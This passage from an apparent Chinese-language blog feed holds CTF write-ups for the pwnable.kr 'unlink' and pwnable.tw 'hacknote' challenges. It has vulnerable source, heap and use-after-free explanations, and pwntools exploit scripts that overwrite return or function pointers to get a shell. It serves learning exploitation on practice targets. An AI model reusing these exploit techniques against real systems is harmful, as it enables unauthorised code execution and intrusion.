class="line"></span><br><span class="line">s.interactive()</span><br></pre></td></tr></table></figure></p><p>感冒10天好了之后现在开始潜心修炼安卓和密码学</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2019-4-6-pwnable.kr-unlink</title>
      <link href="/passages/2019-4-6-pwnable.kr-unlink/"/>
      <url>/passages/2019-4-6-pwnable.kr-unlink/</url>
      
        <content type="html"><![CDATA[<h1 id="2019-4-6-pwnable-kr-unlink"><a href="#2019-4-6-pwnable-kr-unlink" class="headerlink" title="2019-4-6-pwnable.kr-unlink"></a>2019-4-6-pwnable.kr-unlink</h1><p>这一题第一眼看过去以为很简单，结果因为对指针的不熟悉导致卡壳了好久。<br>先用<br>scp -P 2222 <a href="mailto:unlink@pwnable.kr" target="_blank" rel="noopener">unlink@pwnable.kr</a>:/home/unlink/unlink 本地目录地址<br>把unlink和unlink.c下载下来<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagOBJ</span>&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tagOBJ</span>* <span class="title">fd</span>;</span><span class="comment">//4 byte</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tagOBJ</span>* <span class="title">bk</span>;</span><span class="comment">//4 byte</span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">8</span>];<span class="comment">//8 byte</span></span><br><span class="line">&#125;OBJ;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unlink</span><span class="params">(OBJ* P)</span></span>&#123;</span><br><span class="line">OBJ* BK;<span class="comment">//4 byte</span></span><br><span class="line">OBJ* FD;<span class="comment">//4 byte</span></span><br><span class="line">BK=P-&gt;bk;<span class="comment">//4 byte</span></span><br><span class="line">FD=P-&gt;fd;<span class="comment">//4 byte</span></span><br><span class="line">FD-&gt;bk=BK;<span class="comment">//4 byte fd+4=bk</span></span><br><span class="line">BK-&gt;fd=FD;<span class="comment">//4 byte bk=fd</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">1024</span>);</span><br><span class="line">OBJ* A = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</span><br><span class="line">OBJ* B = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</span><br><span class="line">OBJ* C = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</span><br><span class="line"></span><br><span class="line"><span class="comment">// double linked list: A &lt;-&gt; B &lt;-&gt; C</span></span><br><span class="line">A-&gt;fd = B;</span><br><span class="line">B-&gt;bk = A;</span><br><span class="line">B-&gt;fd = C;</span><br><span class="line">C-&gt;bk = B;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"here is stack address leak: %p\n"</span>, &amp;A);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"here is heap address leak: %p\n"</span>, A);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"now that you have leaks, get shell!\n"</span>);</span><br><span class="line"><span class="comment">// heap overflow!</span></span><br><span class="line">gets(A-&gt;buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">// exploit this unlink!</span></span><br><span class="line">unlink(B);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>程序很简单，就是malloc了三个结构体，</p><p>在堆上的抽象结构<br>chunk A size<br>chunk A context（0-3字节存储<em>chunk B，4-7字节为空，+8字节buf）<br>chunk B size<br>chunk B context（头8个字节分别存储着 </em>chunk A、 <em>chunk B，+8字节buf）<br>chunk C size<br>chunk C context（第4-8字节存储着</em>chunk B，+8字节buf）</p><p>实际结构<br><img src="/images/2019-4-6-pwnable-unlink/2019-4-6-16-29.png" alt="avatar"><br>这里有个小问题，可能因为我的kali是64位的，所以在本地的堆是按16位对齐的，而pwnable.kr服务器的堆则是按照8位对齐的，这一点我也是多次失败看别人的题解才发现的，具体原理不懂。</p><p>然后unlink（B），简单来讲就是，让A原本为空的第4-8字节变成C，C原本为空的头四个字节变成A，是一个简化版的模拟unlink<br>B-&gt;fd-&gt;bk=B-&gt;bk<br>B-&gt;bk-&gt;fd=B-&gt;fd</p><p>原本光这样是没什么漏洞的，但因为unlink之前有个gets（A-&gt;buf），gets这个函数的危险性就在于它不会检测边界，可以随意地溢出。<br>通过溢出覆盖B的fd和bk，就可以造成任意地址写入。</p><p>我一开始的想法是让chunk B的fd=shell()函数地址，bk=main函数返回地址，然后发现了一个问题，就是*fd+4位置会被写入bk的值，这样shell函数就被破坏了。</p><p>然后我想到先把shell地址存起来，通过调用这个存放地址来调用shell函数，于是我写了这个payload：’a’*24+p32(heap+0x28)+p32(stack+0x18)+p32(shell_addr)，其中heap、stack是程序自己告诉我们的两个值，heap+0x28是chunkB的buf字段，stack+0x18是存放return地址。</p><p>这里就体现了我对指针的不熟悉，BK=stack+0x18，然后BK-&gt;fd=FD，这个时候return地址就变成了heap+0x28，然而heap+0x28不是shell的地址，而是存储着shell的地址，因为对指针的不熟悉导致我在这里卡了很久<br>用objdump -D unlink看汇编码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">call    unlink</span><br><span class="line">add     esp, 10h</span><br><span class="line">mov     eax, 0</span><br><span class="line">mov     ecx, [ebp+var_4]</span><br><span class="line">leave</span><br><span class="line">lea     esp, [ecx-4]</span><br><span class="line">retn</span><br></pre></td></tr></table></figure></p><p>忍不住看了别人的题解才发现函数返回之前，esp的值会变成[ecx-4]，而[heap+0x28]就是shell()函数地址。retn相当于pop eip，执行retn的时候就会把栈顶的esp赋值给eip，然后实现跳转。<br>所以我们要让ecx-4=shell_addr=heap+0x28，因为ecx=[ebp+var_4]=[ebp-4] (var_4=-4),所以要让ebp-4地址所在的值变成（heap+0x28）+4.<br>这样我们就能构造payload=’a’<em>24+p32(heap+0x28+4)+p32(stack+0x14-4)+p32(shell_addr)或者’a’</em>24+p32(stack+0x14-8)+p32(heap+0x28+4)+p32(shell_addr)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process("./unlink")</span></span><br><span class="line">p=ssh(user=<span class="string">'unlink'</span>,host=<span class="string">'pwnable.kr'</span>,port=<span class="number">2222</span>,password=<span class="string">'guest'</span>,)</span><br><span class="line"></span><br><span class="line">unlink_addr=<span class="number">0x08048504</span></span><br><span class="line">shell_addr=<span class="number">0x080484eb</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">text=p.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span> (text)</span><br><span class="line">stack=int(text[<span class="number">28</span>:<span class="number">38</span>],<span class="number">16</span>)</span><br><span class="line">print(<span class="string">"stack:"</span>,stack)</span><br><span class="line">heap=int(text[<span class="number">-46</span>:<span class="number">-37</span>],<span class="number">16</span>)</span><br><span class="line">print(<span class="string">"heap:"</span>,heap)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.sendline('a'*24+p32(stack+12)+p32(heap+0x28+4)+p32(shell_addr))</span></span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">16</span>+p32(stack+<span class="number">12</span>)+p32(heap+<span class="number">0x20</span>+<span class="number">4</span>)+p32(shell_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>心得体会：还是看汇编靠谱<br>参考题解：<a href="https://www.cnblogs.com/p4nda/p/7172104.html" target="_blank" rel="noopener">https://www.cnblogs.com/p4nda/p/7172104.html</a></p><p>Linux堆溢出漏洞利用之unlink：<br><a href="https://www.cnblogs.com/alisecurity/p/5563819.html" target="_blank" rel="noopener">https://www.cnblogs.com/alisecurity/p/5563819.html</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2019-4-2-hacknote题解</title>
      <link href="/passages/2019-4-2-hacknote%E9%A2%98%E8%A7%A3/"/>
      <url>/passages/2019-4-2-hacknote%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="pwnabletw-hacknote"><a href="#pwnabletw-hacknote" class="headerlink" title="pwnabletw-hacknote"></a>pwnabletw-hacknote</h1><p>借着这道比较基础的uaf（use after free）的题目回顾一下堆溢出<br>先简单说说一下堆</p><h2 id="堆基础"><a href="#堆基础" class="headerlink" title="堆基础"></a>堆基础</h2><p>可以通过gdb的vmmap查看内存空间<br><img src="/images/2019-4-2-hacknote/2019-4-2-20-53.png" alt="avatar"><br>其中[heap]就是堆空间，堆跟栈不同，堆是沿着地址高位增长的</p><p>堆分配的基本策略就是malloc(size)时系统分配堆大小的必定是比size大或等于的8\16的倍数（32位系统为8的倍数，在64位系统则是16的倍数），并且会有一个8字节的堆头（header），里面记录的堆的信息。（之后会在堆专门的学习笔记里详细展开）<br>（目前在我的学习中，只有malloc及其相似的一类函数会分配堆。）<br>所以在32位系统中，最低能分配的就是16字节的堆块（malloc（0）会返回NULL值，或者实际地址，具体取决于系统）</p><h2 id="uaf基础"><a href="#uaf基础" class="headerlink" title="uaf基础"></a>uaf基础</h2><p>当free堆块时，若是没有将堆块指针置NULL的话，那么就可以通过这个指针重新访问堆块，这时候堆块的内容可能为空，也可能是某个地址，最终导致漏洞出现。利用漏洞的方式就在于操作系统的堆管理方式，当一个堆块free后，并不是还给操作系统，而是放入表(bin)中，linux的堆管理存在着127个bin，不同bin的区别主要在于每个bin链表中存放的堆块（chunk）大小不同，像这道hacknote我们就只需要存放16-80字节的fastbin，当我们再次申请堆块空间时，系统就首先会从这些bin中找到最合适大小的堆块空间给我们。这种机制配合uaf再配合对堆内容的写入就能实现任意地址跳转了。</p><h2 id="hacknote函数解析"><a href="#hacknote函数解析" class="headerlink" title="hacknote函数解析"></a>hacknote函数解析</h2><p><img src="/images/2019-4-2-hacknote/2019-4-2-21-12.png" alt="avatar"><br>这次专注于基础的堆溢出，有用的信息就是该程序是16位<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);<span class="comment">//开启CANARY后会在每个函数多出这个，从汇编上可以看出是在栈低，也就是ebp上方填入一个数字，跟本题无关</span></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_8048956();</span><br><span class="line">      read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">      v0 = atoi(&amp;buf);</span><br><span class="line">      <span class="keyword">if</span> ( v0 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      sub_80487D4();<span class="comment">//delete函数</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v0 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_80488A5();<span class="comment">//print函数</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v0 == <span class="number">4</span> )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Invalid choice"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v0 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      sub_8048646();<span class="comment">//add函数</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><p>main函数挺简单的，重点就三个函数，delete、print、add，其中uaf漏洞就存在于delete中，接下来我们看delete函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Index :"</span>);</span><br><span class="line">read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">v1 = atoi(&amp;buf);</span><br><span class="line"><span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= dword_804A04C )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Out of bound!"</span>);</span><br><span class="line">  _exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( ptr[v1] )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span>(*((<span class="keyword">void</span> **)ptr[v1] + <span class="number">1</span>));</span><br><span class="line">  <span class="built_in">free</span>(ptr[v1]);<span class="comment">//重点在这，free后没有把指针置null，导致堆块虽然清空了，但是指针还保存着堆栈的地址，从而能访问空的堆栈，另外值得注意的是先free掉ptr[v1]+1指向的地址（字符串context），然后再free ptr[v1]</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Success"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br></pre></td></tr></table></figure><p>知道漏洞是uaf后就要开始考虑怎么利用了,先看看add函数是怎么申请空间的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line"><span class="keyword">if</span> ( dword_804A04C &lt;= <span class="number">5</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !ptr[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      ptr[i] = <span class="built_in">malloc</span>(<span class="number">8u</span>);<span class="comment">//首先申请一个8字节的空间，实际上会分配16字节</span></span><br><span class="line">      <span class="keyword">if</span> ( !ptr[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Alloca Error"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      *(_DWORD *)ptr[i] = sub_804862B;<span class="comment">//这里是让刚才申请的堆块头部放入指向sub_804862B的指针，这样访问该堆块的时候就会执行这个函数，这个函数的作用就是put，并且参数是堆块本身，之后会用于地址泄露</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Note size :"</span>);</span><br><span class="line">      read(<span class="number">0</span>, &amp;buf, <span class="number">8u</span>);</span><br><span class="line">      size = atoi(&amp;buf);</span><br><span class="line">      v0 = ptr[i];</span><br><span class="line">      v0[<span class="number">1</span>] = <span class="built_in">malloc</span>(size);<span class="comment">//第二次申请堆空间，第一次申请的空间ptr[i]就是v0[0]，第二次申请的空间的指针就会存放到v0[1]中，这样put函数就能输出第二次申请的空间内储存的值了</span></span><br><span class="line">      <span class="keyword">if</span> ( !*((_DWORD *)ptr[i] + <span class="number">1</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Alloca Error"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Content :"</span>);</span><br><span class="line">      read(<span class="number">0</span>, *((<span class="keyword">void</span> **)ptr[i] + <span class="number">1</span>), size);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Success !"</span>);</span><br><span class="line">      ++dword_804A04C;</span><br><span class="line">      <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Full"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br></pre></td></tr></table></figure><p>这么分析可能还不够直白，上手操作一下<br><img src="/images/2019-4-2-hacknote/2019-4-2-21-44.png" alt="avatar"><br>这是我们要申请的堆块</p><p><img src="/images/2019-4-2-hacknote/2019-4-2-21-47.png" alt="avatar"><br>可以看到在堆块的起始位置0x0804b000偏移0xc的位置有个0x151的偏移，那就是存储着内容的堆的起始地点（为什么和实际index：0的堆块差了15个字节以后再讲），可以看到0x804b160就存储着我们刚申请的堆块，其中0x0804862b就是指向put函数的地址，0x0804b170就是字符串“aaaaaaaaaaaaaaa”的位置，之后会作为put函数的参数。</p><p>让我们来看一下print函数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Index :"</span>);</span><br><span class="line">read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">v1 = atoi(&amp;buf);</span><br><span class="line"><span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= dword_804A04C )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Out of bound!"</span>);</span><br><span class="line">  _exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( ptr[v1] )</span><br><span class="line">  (*(<span class="keyword">void</span> (__cdecl **)(<span class="keyword">void</span> *))ptr[v1])(ptr[v1]);<span class="comment">//ptr[v1]就是堆块地址，堆块头存储着put函数的地址，put函数的参数就是ptr[v1]，也就是它本身。</span></span><br><span class="line"><span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br></pre></td></tr></table></figure></p><p>再看看puts函数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="built_in">puts</span>(*(<span class="keyword">const</span> <span class="keyword">char</span> **)(a1 + <span class="number">4</span>));</span><br></pre></td></tr></table></figure></p><p>可以看到put会输出a1+4，也就是ptr[v1]+4，那个位置存储着字符串的地址</p><h2 id="hacknote题解"><a href="#hacknote题解" class="headerlink" title="hacknote题解"></a>hacknote题解</h2><p>分析完函数，弄懂整个程序后开始构造脚本了，首先我们要想办法泄露地址，因此要在第一次申请的堆栈内写入我们需要的地址，比如read()，然后用得到的read()函数实际地址减去libc中read的偏移量，得到程序加载libc的基址，再用这个基址加上system的偏移量，得到system函数在程序实际执行时的地址，最后再写入一次system的地址和字符串“sh”，执行后得到shell</p><p>想要往第一次申请的堆块中写入内容，就要利用到fastbin的特性，free后的堆块会放到fastbin链表的表尾，在之后申请同样大小的堆块时会先分配表尾的空间。所以我们先add两次，输入的context size等于16（这里只要大于8就行，也就是不要让两个context和ptr[0]free后在一个链表就行），然后都free掉（delete index0和index1），这时index0[0]在fastbin的16字节链表的表头，index1[0]在表尾，至于两个context则在fastbin的32字节链表。<br>当我们再add一个context size为8的index2时，index2[0]的16字节空间会利用fastbin16字节链表表尾的index1[0]，而context申请的16字节空间就在index0[0]的位置，这时候我们输入的context就会把index0的头部修改了。</p><p><img src="/images/2019-4-2-hacknote/2019-4-2-22-25.png" alt="avatar"><br>可以看到我们add两次后的堆空间内容，这里我申请的context size为16，所以它给我对齐成了32字节（这里有点困惑，按理来说32位系统应该分配给我24字节的空间，delete后之后我尝试申请24字节的空间，给我的也是原本那片空间，可见的确是分配了32字节）</p><p><img src="/images/2019-4-2-hacknote/2019-4-2-22-29.png" alt="avatar"><br>当我分别delete index0和index1然后申请了size=8的index2后<br>堆空间变了，原本index0[0]的空间内容变成了我输入的字符串“cccccccc”<br>然后就可以写我们的脚本了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">"./hacknote"</span>)</span><br><span class="line"><span class="comment">#libc=ELF('./libc_32.so.6',checksec=False)</span></span><br><span class="line">libc=ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">//ldd hacknote得到在本机使用的库</span><br><span class="line">elf=ELF(<span class="string">'./hacknote'</span>,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">read_libc=libc.symbols[<span class="string">'read'</span>]</span><br><span class="line">read_got=elf.got[<span class="string">'read'</span>]</span><br><span class="line">read_symbol=elf.symbols[<span class="string">"read"</span>]</span><br><span class="line">system_libc=libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"Your choice :"</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Note size :"</span>,<span class="string">"16"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Content :"</span>,<span class="string">"a"</span>*<span class="number">15</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Your choice :"</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Note size :"</span>,<span class="string">"16"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Content :"</span>,<span class="string">"a"</span>*<span class="number">15</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Your choice :"</span>,<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Index :"</span>,<span class="string">"0"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Your choice :"</span>,<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Index :"</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Your choice :"</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Note size :"</span>,<span class="string">"8"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Content :"</span>,p32(<span class="number">0x0804862b</span>)+p32(read_got))</span><br><span class="line">p.sendlineafter(<span class="string">"Your choice :"</span>,<span class="string">"3"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Index :"</span>,<span class="string">"0"</span>)</span><br><span class="line">a=p.recv()</span><br><span class="line">read_addr=u32(a[:<span class="number">4</span>])</span><br><span class="line">print(<span class="string">"a--------------"</span>)</span><br><span class="line">print(a)</span><br><span class="line">print(<span class="string">"base_addr---------------"</span>)</span><br><span class="line">print(hex(read_addr))</span><br><span class="line"></span><br><span class="line">base_addr=read_addr-read_libc</span><br><span class="line">system_addr=system_libc+base_addr</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Index :"</span>,<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Your choice :"</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Note size :"</span>,<span class="string">"8"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Content :"</span>,p32(system_addr)+<span class="string">"||sh"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这里比较特别的就是system的参数要用到截断字符，因为之前print函数里是(<em>(void (__cdecl **)(void 